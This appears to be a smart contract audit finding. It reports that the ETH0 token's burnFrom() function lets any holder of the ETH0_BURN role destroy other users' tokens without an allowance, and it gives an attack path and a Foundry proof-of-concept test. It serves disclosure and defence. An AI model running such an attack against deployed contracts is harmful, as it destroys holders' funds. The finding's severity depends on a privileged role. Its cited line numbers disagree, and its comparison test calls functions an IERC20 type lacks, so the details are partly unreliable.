# Missing Allowance Check in burnFrom() Function

### Summary

Missing allowance validation in the burnFrom() function will cause unauthorized token burning for token holders as any actor with ETH0_BURN role will bypass ERC20 allowance mechanisms to burn tokens from any account without permission.

https://github.com/sherlock-audit/2025-05-usual-eth0/blob/main/eth0-protocol/src/token/Eth0.sol#L169C5-L177C6

### Root Cause

In Eth0.sol:burnFrom() lines 182-188, there is a missing allowance check and decrement before burning tokens from another account, violating the standard ERC20 pattern where burnFrom() should verify and consume allowances like transferFrom().

```solidity
    function burnFrom(address account, uint256 amount) public {
        if (amount == 0) {
            revert AmountIsZero();
        }


        Eth0StorageV0 storage $ = _eth0StorageV0();
        $.registryAccess.onlyMatchingRole(ETH0_BURN);
        _burn(account, amount);
    }
```

### Internal Pre-conditions

Actor needs to obtain ETH0_BURN role through admin assignment or by being the DaoCollateral contract
Target victim needs to hold ETH0 tokens in their account balance
No allowance needs to be granted by victim to the attacker (this is the vulnerability - it should be required)

### External Pre-conditions

No external pre-conditions required - this is purely an internal smart contract logic flaw.


### Attack Path

Attacker obtains ETH0_BURN role either by being assigned by admin or by compromising DaoCollateral contract
Attacker identifies victim with substantial ETH0 balance by checking balanceOf(victim)
Attacker calls burnFrom(victim, victimBalance) without having any allowance from victim
Function bypasses allowance check and proceeds directly to burn tokens
Victim's ETH0 tokens are permanently destroyed without their consent or compensation
Attacker can repeat this attack on multiple victims until all ETH0 tokens are burned

### Impact

The token holders suffer a 100% loss of their ETH0 token balance. The attacker gains the ability to destroy any user's tokens without authorization, effectively stealing value by permanent destruction rather than transfer.

### PoC

```solidity
function testUnauthorizedBurnFromAttack() public {
    // Setup: Victim has 1000 ETH0 tokens
    address victim = makeAddr("victim");
    uint256 victimBalance = 1000e18;
    
    // Mint tokens to victim
    vm.prank(address(daoCollateral)); // Has ETH0_MINT role
    eth0.mint(victim, victimBalance);
    
    // Verify victim has tokens and attacker has no allowance
    assertEq(eth0.balanceOf(victim), victimBalance);
    assertEq(eth0.allowance(victim, attacker), 0); // No allowance granted
    
    // Attacker gets ETH0_BURN role (could be compromised DaoCollateral or malicious admin)
    vm.prank(admin);
    registryAccess.grantRole(ETH0_BURN, attacker);
    
    // Attack: Burn victim's tokens without allowance
    vm.prank(attacker);
    eth0.burnFrom(victim, victimBalance); // Should fail but doesn't!
    
    // Verify attack succeeded
    assertEq(eth0.balanceOf(victim), 0); // Victim lost all tokens
    assertEq(eth0.totalSupply(), 0); // Tokens permanently destroyed
    
    // Verify allowance was never checked
    assertEq(eth0.allowance(victim, attacker), 0); // Still no allowance
}

function testStandardERC20BurnFromComparison() public {
    // Show how standard ERC20 burnFrom should work
    IERC20 standardToken = new MockERC20();
    
    address victim = makeAddr("victim");
    standardToken.mint(victim, 1000e18);
    
    // This should revert without allowance
    vm.expectRevert("ERC20InsufficientAllowance");
    vm.prank(attacker);
    standardToken.burnFrom(victim, 1000e18);
    
    // Only works with proper allowance
    vm.prank(victim);
    standardToken.approve(attacker, 1000e18);
    
    vm.prank(attacker);
    standardToken.burnFrom(victim, 1000e18); // Now succeeds
}
```

### Mitigation

Add proper allowance validation and spending to the burnFrom() function following standard ERC20 patterns.
